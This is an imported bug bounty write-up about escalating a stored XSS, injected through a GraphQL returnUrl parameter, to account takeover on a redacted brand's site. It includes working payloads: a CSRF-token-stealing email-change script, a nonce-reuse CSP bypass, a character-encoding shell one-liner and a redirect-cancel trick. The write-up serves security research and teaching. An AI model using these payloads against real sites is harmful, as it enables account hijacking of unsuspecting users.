---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-29_bug-writeup-stored-xss-to-account-takeover-ato-via-graphql-api.md
original_filename: 2023-06-29_bug-writeup-stored-xss-to-account-takeover-ato-via-graphql-api.md
title: 'Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API'
category: blogs
detected_topics:
- xss
- sso
- command-injection
- password-reset
- otp
- graphql
tags:
- imported
- blogs
- xss
- sso
- command-injection
- password-reset
- otp
- graphql
language: en
raw_sha256: 07d7825093308b3916125c92ccd08377b6446d3e6af2ecba7d8d1438cbc18aee
text_sha256: b7084e33bcab1561f9c9ee09c56ef54494d0c78dd1614cc8b6d26352ead58a40
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-29_bug-writeup-stored-xss-to-account-takeover-ato-via-graphql-api.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, password-reset, otp, graphql
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `07d7825093308b3916125c92ccd08377b6446d3e6af2ecba7d8d1438cbc18aee`
- Text SHA256: `b7084e33bcab1561f9c9ee09c56ef54494d0c78dd1614cc8b6d26352ead58a40`


## Content

---
title: "Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API"
page_title: "Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API | A developer's notes in the world of security research and bug bounty, by pmnh"
url: "https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/"
final_url: "https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/"
authors: ["Peter M (@pmnh_)"]
bugs: ["Stored XSS", "CSP bypass", "Account takeover", "GraphQL"]
publication_date: "2023-06-29"
added_date: "2023-07-03"
source: "pentester.land/writeups.json"
original_index: 991
---

# Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API

Jun 29, 2023 · 16 min read · [writeup ](https://www.pmnh.site/tags/writeup "writeup")[xss ](https://www.pmnh.site/tags/xss "xss")[graphql ](https://www.pmnh.site/tags/graphql "graphql")[hackerone ](https://www.pmnh.site/tags/hackerone "hackerone") ·

Share on: [ ](https://twitter.com/intent/tweet?text=Bug%20Writeup%3a%20Stored%20XSS%20to%20Account%20Takeover%20%28ATO%29%20via%20GraphQL%20API&url=https%3a%2f%2fwww.pmnh.site%2fpost%2fwiteup_lhe_graphql_stored_xss%2f&tw_p=tweetbutton "Share on Twitter")[ ](https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.pmnh.site%2fpost%2fwiteup_lhe_graphql_stored_xss%2f&t=Bug%20Writeup%3a%20Stored%20XSS%20to%20Account%20Takeover%20%28ATO%29%20via%20GraphQL%20API "Share on Facebook") [](https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/ "Copy Link")

## Overview

  * Stored XSS to Account Takeover (ATO) via GraphQL API
  * The Setup
  * The Payload
  * Attempt 1: `javascript://` url
  * Side Note: Several false starts here
  * Attempt 2: Trailing payload
  * Submission
  * Challenge Accepted!
  * Next Step: Building the ATO payload
  * Attempt 3: Rejection
  * Attempt 4: Async
  * Attempt 5: One more thing...
  * Attempt 6: A different approach
  * Attempt 7: Special Character avoidance
  * Final Step: That pesky redirect
  * Conclusion

## Stored XSS to Account Takeover (ATO) via GraphQL API

Late last year on HackerOne during an LHE (this is only important later due to an extreme time crunch), I found an extremely challenging vulnerability on a major brand's web site involving several layers of exploitation ultimately resulting in a stored XSS payload that was able to take over a victim's account simply by visiting a specific, innocuous page on the brand's main website (`www.redacted.com`). The scope of this vulnerability was entirely within the brand's public program.

This vulnerability paid out as a high (CVSS 8.7) and I thought the process of discovering and then exploiting it would be interesting to describe. One thing that I will not shy away from here is that I was stuck - completely stuck - several times during the course of exploiting this vulnerability. I almost gave up and thought it was impossible, particularly because I have a very bad track record for exploiting tough XSS and especially dealing with weird encoding solutions.

However, I thought it could also be inspiring and maybe someone reading this will reconsider a bug they thought that they took to the limit - and push through to a higher impact outcome!

## The Setup

The initial vulnerability that I found had to do with this brand's payment processing API - this is an API that is used by customers (merchants) to process credit cards and financial transactions in various countries. This brand is multi-national, so they deal with many different types of transactions in many different countries - including some that I, based in the US, had never heard of and had to research as part of my recon.

One type of transaction that this payment processor supported was an offline payment flow to handle geographies where credit cards are uncommon and cash transactions are more prevalent. In these locations, the payment processor allows a customer to make an e-commerce purchase and acquire a unique code (like a QR code) which they can bring into a store and pay cash for the transaction. Once the store confirms the transaction, the e-commerce merchant is paid for the goods and the customer will receive them.

Thus, the flow of the transaction goes something like this:

  * e-commerce merchant initiates an offline payment flow when the customer places their order
  * e-commerce merchant gives the customer a unique in-store code which can be used for payment
  * (offline) customer brings the code to a store in the payment network and pays in cash
  * e-commerce merchant is notified that the payment occurred
  * e-commerce merchant sends the customer a unique URL which they can visit to confirm their purchase

Note that the "unique URL" in the final step is supplied by the merchant when the transaction is set up (you can think of this as the "confirmation URL" in a traditional online credit card-based workflow).

## The Payload

In this case our attacker is a merchant (or a user of that merchant) with the ability to create these offline transactions. The merchant will submit a confirmation URL containing an XSS payload. This payload, once persisted, is visible under a page on the brand's main website (`www.redacted.com`).

Our merchant submits the request via a GraphQL API on a different domain `payments.redactedtwo.com` which has a payload as follows (apologies for so much redaction):
  
  
  1POST /graphql HTTP/1.1
  2Host: payments.redactedtwo.com
  3...
  4
  5{"query":"mutation {\n  ...redacted...(input:{ ...redacted... \n
  6  returnUrl: \"<payload here>\" ... }) ...
  

We can see this GraphQL API accepts a `returnUrl` parameter that will be our payload source. Note that the GraphQL call is an API on a completely separate top-level domain. This was interesting because it allowed a stored payload in one of the brand's domains to be rendered in another, arguably more critical, domain. Once submitted, we can visit a unique, static URL on the `www.redacted.com` site containing our payload in the `returnUrl` parameter.

Let's see how the payload appears on the sink at `www.redacted.com`:
  
  
  1<script nonce="G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE">
  2window.location.href = '<payload>?..dynamic url parameters...'
  3</script>
  

We see this script has a nonce, and our injection point `<payload>` is within the script - seems like a very easy stored XSS, right?

The presence of the nonce will become important later, let's look at the `Content-Security-Policy` header to see what restrictions that are in place (note: I didn't look at CSP until I was well into payload development - big mistake that caused me to backtrack at least 2 hours for reasons I will describe later). I'll break it into lines for easier reading:
  
  
  1Content-Security-Policy:
  2default-src 'self' 'unsafe-inline' https://*.redacted.com https://*.redactedtwo.com;
  3script-src 'nonce-G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE' 'self' 'unsafe-inline' https://*.redacted.com https://*.redactedtwo.com;
  4img-src 'self' https:;
  5frame-src 'self' https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com;
  6child-src 'self' https://*.redacted.com https://*.redactedtwo.com;
  7object-src 'none';
  8font-src 'self' https://*.redacted.com https://*.redactedtwo.com;
  9base-uri 'self' https://*.redacted.com;
  10form-action 'self' https://*.redacted.com;
  11upgrade-insecure-requests;
  12connect-src 'self' 'unsafe-inline' https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com;
  

We can see that this CSP is quite restrictive - we can only source information from the (hardened) brand site itself, and the nonce is required for any script tags on the page.

## Attempt 1: `javascript://` url

The obvious first attempt with an injection point at the `location.href=` is to simply put a Javascript scheme with a payload, e.g. `javascript://alert(1)`. I was lucky because here there was no obvious WAF blocking simple payloads like this. So I tried this and...

... it failed. The GraphQL API rejected the URL with a `400` error. I tried many other attempts, encoding, base, whitespace, etc. - no luck. The API was validating that the URL provided started with `https://` and contained a full hostname followed by a trailing `/`. So clearly we have an open redirect but I knew this could be exploited for a stored XSS.

For example `https://hackerone.com/` would result in the following stored payload:
  
  
  1<script nonce="G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE">
  2window.location.href = 'https://hackerone.com/?...dynamic URL parameters...'
  3</script>
  

A quick note on the `...dynamic URL parameters...` \- these are parameters which are appended to the URL provided in the GraphQL API representing the unique transaction ID, information about the customer, etc. - this always is appended with a leading `?` within the single quotes.

### Side Note: Several false starts here

Later on in this story, for reasons which will become obvious, I tried submitting various forms of `https://` urls without the trailing slash - this would lead to everything after the hostname being URL encoded and generally being useless for XSS in a Javascript context. I should have tried this earlier on as it would have saved a ton of time later.

## Attempt 2: Trailing payload

We know at this point the payload has to start with a valid URL and hostname, so we start with `https://hackerone.com/` as the start of our payload.

Fortunately for us, the next most obvious payload I could think of worked. Single quote characters were not blocked or encoded in any way, so the following payload actually generated a stored alert:
  
  
  1https://hackerone.com/';alert(document.domain);//
  

This generated an alert (great) but when closed the user was immediately redirected to the URL provided. Excellent! Stored XSS payload with DOM access!

## Submission

At this point I thought I was good and submitted the bug in the LHE prior to the on-site portion of the event. After it was triaged at a Medium impact, I sent a note to the triage / customer team asking what was required to prove higher impact.

> As an aside, for those who don't know how HackerOne LHEs are structured, there is a portion (5.5 days) during which the LHE participants are informed on the scope and can submit bugs. These bugs are triaged but not finalized / paid until the live portion of the event. The live portion comprises a single day (actually ~10 hours) where participants can submit additional bugs or escalated previously submitted bugs.

The customer (via the triage team) responded that they felt with the CSP and cookie settings in place on the main site, it was not possible to escalate the stored XSS to any higher severity.

## Challenge Accepted!

Of course I considered this a challenge because I knew with the payload sitting in a `<script nonce>` context I should be able to craft any payload I want, exploiting this will be easy!

## Next Step: Building the ATO payload

I began to craft the best stored XSS ATO payload I could imagine. The payload performed the following tasks, which I tested in the dev console (F12) of a window I had open on the main site:

  * Grab the CSRF token for the user by making a `XMLHttpRequest` to the site's main page
  * Extract the CSRF token by parsing the HTML returned from the `fetch` call
  * Make an API call to change the email address on the account using `XMLHttpRequest`

Note that the [`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src) in the CSP made it impossible to try to exfiltrate information from the page to an attacker domain using Javascript, therefore ATO (or similar behavior of CSRF was my option for an impactful payload here).

At this point the account can be taken by the attacker as they control the email address and can use the "forgot password" functionality to complete the takeover. The cookies (even `HttpOnly`) will be sent on the last request becasse the same-origin policy will allow them to be included (the XHR is originating from the correct domain, `www.redacted.com`).

As I imagine most of you are familiar with writing a payload of this type I won't get into details here, as it was pretty simple:
  
  
  1function decodeHtml(html) {
  2  var txt = document.createElement("textarea");
  3  txt.innerHTML = html;
  4  return txt.value;
  5}
  6fetch("https://www.redacted.com/url/to/get/csrf/").then(r => r.text()).then(r => {
  7  csrf_token = /data-token="([^"]*)"/.exec(r)[1]
  8  var xhr = new XMLHttpRequest();
  9  xhr.open("POST", "https://www.redacted.com/api/to/change/email", true);
  10  xhr.setRequestHeader("X-Csrf-Token", decodeHtml(csrf_token));
  11  xhr.setRequestHeader("Content-Type", "application/json");
  12  xhr.withCredentials = true;
  13  o=new Object(); ... other parameters ...  o.email='<my_email_address>';
  14  xhr.send(JSON.stringify(o));
  15})
  

I tested this in the Chrome dev console and confirmed it had the desired effect of ATO. Ready to go!

## Attempt 3: Rejection

I submitted the payload to the GraphQL API and it was looking good! No errors initially, but then I hit the stored XSS page itself and saw...
  
  
  1HTTP/2 400 Bad Request
  

The stored payload did not render!

Went back to the original `alert(document.domain)` payload, and it worked. So, there must be something in my complete ATO payload that was causing the server not to render the XSS.

After _much_ iteration with the working payload (unfortunately since source and sink were different transactions and required several in-between steps, I couldn't use any convenient automated tools), I discovered that _all_ the following characters would lead to the `400` error:
  
  
  1{}<>"[]
  

Note all whitespace characters were also rejected. There may be other characters that I don't remember 😁 but the following definitely were _not_ blocked:
  
  
  1()=.;/\
  

So, I had a limited Javascript vocabulary to deal with, no problem!

## Attempt 4: Async

I ended up rewriting most of my payload to exclude the restricted characters. Note that I tried all types of encoding (URL, javascript, hex, octal, double-encoding, etc.) and none of these could be used to bypass the restrictions. I'll note this was extremely tedious because the error showed up at the sink, not the source, so each iteration wasted at least a minute or two.

I even got the initial `fetch` request to work with the restricted character set, with something like:
  
  
  1https://hackerone.com/';fetch("https://www.redacted.com/url/to/get/csrf/").then(console.log);//
  

I could see the `Response` object from the `fetch` call hit the console log - now we are getting somewhere!

Then I ran into **the big problem**.

Remember that my attack chain requires 3 steps:

  * Make XHR call to get page with CSRF token on it
  * Extract CSRF token from the returned HTML
  * Make XHR call with CSRF token to ATO

Because `fetch` (and `XMLHttpRequest`) are async APIs we need to fill in the `then` method argument with a [lambda function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions), which will be asynchronously executed when the Promise resolves (more on this at [mdn](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Promises)). Here's the problem, without the `{}>` characters I do not believe there is a way to construct a lambda function in Javascript, either with brace syntax or arrow syntax (if someone smart reading this comes up with a suggestion, my DMs are open on Twitter and I'm very interested!).

I recognized this immediately as a huge roadblock. Even if I rewrite the rest of my payload to avoid all these other characters (which ended up being possible) the inability to define lambda functions to be called when the Promise resolved was a showstopper.

But wait! In the documentation of the `Function` object in the Javascript reference, there is a form `Function(var, body)` where `body` is a _string_! No braces or arrow syntax required!

## Attempt 5: One more thing...

I excitedly rewrote my payload to take advantage of this amazing syntax only to find something I missed in the CSP... `eval` is not allowed due to the CSP missing the `unsafe-eval` directive. That's right, this form of the `Function` constructor (not surprisingly) uses `eval` under the covers to convert that string to an actual Javascript function.

This was unfortunate because I wasted about 30 precious minutes figuring out how this syntax worked (the documentation is a bit vague on how variables are passed in and referenced).

I decided that this approach was simply impossible due to the specific characters that were being blocked. (Actually at this time I hadn't figured out that whitespace was also blocked for some reason, I will blame lack of sleep), which would have made writing a function difficult to impossible anyway.

## Attempt 6: A different approach

So at this point I got some food as I had been struggling for at least 3 hours without a break. As I wandered the hall I pondered. Clearly I could call Javascript methods because I had access to the `().;` characters. Surely I could come up with something!

(I'll add that I'm sure someone would have been more than happy to help me but as this was my first LHE I wanted to get a really impactful bug without assistance of any kind!)

I realized three things at this point:

  * In order to successfully deliver my working payload I needed to work around the blocked special characters,
  * I had confirmed that I could execute arbitrary Javascript code provided I was careful about what characters I used,
  * I had access to the correct value of the nonce in the DOM on the `<script>` tag that was already there

I decided that I'd try the following approach:

  * Use very simple Javascript to create a new `<script>` DOM node
  * Set the nonce on that script node to match the nonce of the `<script>` node already on the page
  * Figure out a way to encode my payload so that I could set the `innerText` of the new `<script>` node to a value that did not have special characters
  * Insert my new `<script>` tag into the DOM and the payload will execute

> As a fun bit of trivia, if you haven't already encountered this - if a `<script>` tag has already started executing (the one tag on the page), replacing the `innerText` will do nothing. Due to the CSP I didn't see any way other than a `<script>` tag with nonce to execute my payload (again, I'm interested in comments or suggestions if I did!).
> 
> However, if the page hasn't completed rendering and execution of inline script, you can insert a new `<script>` node after the inline script and it will execute (note this _only_ works if the page hasn't loaded yet - if you try to insert a `<script>` DOM node after the `onload` event has fired, it's too late).

Hope you are all still with me!

I decided to try this with a simple payload that looked something like this:
  
  
  1https://hackerone.com/';s=document.createElement('script');s.nonce=document.getElementsByTagName('script').item(1).nonce;s.innerText='alert(document.domain);';document.head.appendChild(s);;//'
  

I fired it and... it worked! The alert popped and the presence of the nonce on the new tag allowed my script to pass the CSP checks.

Super excited because it seemed like this strategy was going to work!

## Attempt 7: Special Character avoidance

I will say that I basically had the idea for the rest of the payload at this point, but I was under extreme time pressure to submit my escalation before the end of the LHE and ended up wasting some time with a couple stupid mistakes.

The first mistake was trying to just encode only those characters that were being blocked. This was hard to do manually and took a lot of time when I discovered I missed a character.

So I decided on the following approach:

  * Create a file `redacted_payload.txt` with my Javascript payload
  * Run the following shell command to encode every character in the file into a series of calls to `String.fromCharCode`

The resulting shell command:
  
  
  1(for i in `cat redacted_payload.txt | xxd -ps -c 0 | sed -e 's/\(..\)/\1\n/g'`; do echo "String.fromCharCode("$((16#${i}))")+"; done) | tr -d '\n'
  

And the output:
  
  
  1String.fromCharCode(123)+String.fromCharCode(32)+String.fromCharCode(102)+String.fromCharCode(117)+
  2... repeating for many characters ...
  

Again, when not under time pressure I'm sure I could some up with something more elegant here, but this worked and I ended up with a very large payload (fortunately there was no length limit on the URL that could be stored!).

I submitted the full payload which now looked like:
  
  
  1https://hackerone.com/';s=document.createElement('script');s.nonce=document.getElementsByTagName('script').item(1).nonce;s.innerText=<very_long_encoded_payload>;document.head.appendChild(s);;//'
  

And...it didn't work. That's when I remembered something I overlooked...

## Final Step: That pesky redirect

Remember that the inline script where we are injecting started by redirecting the window by setting the `location.href` attribute. This causes the browser to start navigating, at which point it may / may not complete execution of any further inline script and it _certainly_ will not wait for async `Promise`s to complete such as an XHR or `fetch`. What I was seeing was that my encoded payload _was_ working but the browser would immediately navigate away from the page and the whole thing didn't get the chance to complete.

Also remember that the redirect has to start with a legitimate hostname, so there was no chance of providing an invalid redirect which the browser would not navigate to.

At this stage I started to panic a little bit, I had about 30 minutes before submissions closed and I knew that I was within reach of an escalation. I trolled the Javascript reference about the behavior of `location.href` when set, and I saw the little gem `window.stop()` which is documented as "aborts browser naviagtion". This looked like my answer, so I added a call immediately after the end of the URL string as so:
  
  
  1https://hackerone.com/';window.stop();s=document.createElement('script');s.nonce=document.getElementsByTagName('script').item(1).nonce;s.innerText=<very_long_encoded_payload>;document.head.appendChild(s);;//'
  

Good news: this had the intended effect of stopping the redirect!

Really really bad news: this also stopped any outstanding `fetch` or `XHR` request with no easy way to recover.

Although it probably would have been possible to write some clever code to deal with this problem, I now only had 20 minutes left and needed a solution fast!

At this point I wondered if I set `location.href` _again_ to something else, if that 2nd assignment would override the first navigation if it was fast enough. At first I tried with a `javascript:` URL (this would have been too easy), and finally discovered that the URL `foo://a` would make the browser behave exactly as I hoped:

  * Stop the navigation to the legit URL
  * Generate an error (not important)
  * Allow further XHR/`fetch` requests to proceed

At this point, with only 15 minutes until submissions closed, I had my final payload:
  
  
  1https://hackerone.com/';location.href='foo://a';s=document.createElement('script');s.nonce=document.getElementsByTagName('script').item(1).nonce;s.innerText=<very_long_encoded_payload>;document.head.appendChild(s);;//'
  

I submitted the payload along with evidence of the successful stored XSS to ATO with literally minutes to spare, and having spent almost 6 straight hours on this escalation chain.

The customer accepted this escalation and was very surprised that this was possible with all the protections in place.

## Conclusion

A few final wrap-up tips:

  * Being familiar with Javascript language and syntax can be really helpful when out-of-the-box payloads don't work. The MDN reference material is hugely helpful in this regard.
  * Being familiar with the language will also help you better work around major blockers such as special characters.
  * Under time pressure, it is very important to know when you are on a dead-end and backtrack to try a new approach - I did this several times during this exercise.
  * Knowing how to write simple text processing scripts will save a ton of time if weird encoding is required.

I am sure that there are other ways this problem could have been solved, but I thought the journey to a solution and the thought process (and failures!) at the different stages might be interesting to readers
